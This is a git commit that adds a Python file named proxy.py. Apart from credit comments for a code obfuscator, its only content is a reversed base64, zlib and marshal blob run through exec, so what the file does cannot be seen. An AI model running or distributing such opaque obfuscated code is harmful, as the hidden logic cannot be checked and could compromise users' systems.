2c41aa4a3aea4518e0a3eac4282f4ed2904bc64d
quan1306 <108608071+quan1306@users.noreply.github.com>
2023-11-21 09:49:20 +0700

    Create proxy.py

---
+++ proxy.py
@@ -0,0 +1,8 @@
+#Encode By Dương Ngọc Phong
+#Zalo : @duongngocphong0311
+#Telegram : @duongngocphong0311
+#Time Encrypted : Tue Oct  3 11:58:47 2023
+
+print('_Duong_Ngoc_Phong_Encode_Obfuscator_')
+
+_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'=sl/jjHB+jBg8qDRyJsSfYeemTkHGm8+uWjLkG/SNukzMxkRcTcUaMRGu42/SscitfM2mE4L4fN4fyOQA73H3B8G0kR9RGzvRcb3kFSssdMO/TDztaaZtszCyqifs8Hr9rz0r2kHD+TWg4S5o35x4MDVVWbSLpEymn6aXgC6ZOFRKrtJSFNfWU1yqXN7Ktz9rdyxs9ZF363pvlXd8znT1TpTdFPqDQNSC1eHaw/3vikwXgl4afsEbvzeNpn6hGauBW1aKpmGyTwN21gWgUHCHdZYNCVAvG8oi4FPFuZbwyLJpnnQ8fC6+fkA57iomGS52OXcYPTlO9EXzKZHQoNzcNB25msEEbPK2ecUnp8a8g3i8snHcNtw5xWH0OTyCQY92cPueN8UoukJ6lYsIQKjv2VWZq5XUDWWOWfCr+WSsMuz6o+OruAbXN1Fo33Vh5e0UhqesfbaZvVazyY7lxmM2G4izHbnuOrG0Pcn/01ixc3UBkF+m0do8alt2PzpDSLkNnT+2Fi2u5k0TLEa1ddTJryDpNfflMzLQVl+ltTiCBKdcA2jiSsQwtH+LLjQQtx8oUiQbNVj2dkHEVWTDKHvufwweLPDOqghhgRCRoI5KorHD04b3d0zUkdT+FEq/4b4bNUhXC/SvipQ38HqHozsszSO7LB2cAGZQodSgbFj4BTOSqP44Mwnh1E5ODGHAhsskDMM5RUwwsBwRYyjnlbL/OgJ3v53/uXzv7XGY2fTi1W2Jn+QUvoe86pwcEII/K9K9jCpRggoCeIokiB5qgBfZ35d0R50dA5hKm+eEUUKBVbNtxgFWvLdCKdtr0q4FFbNzyW2fM7fUE0Er1MU9xJe'))
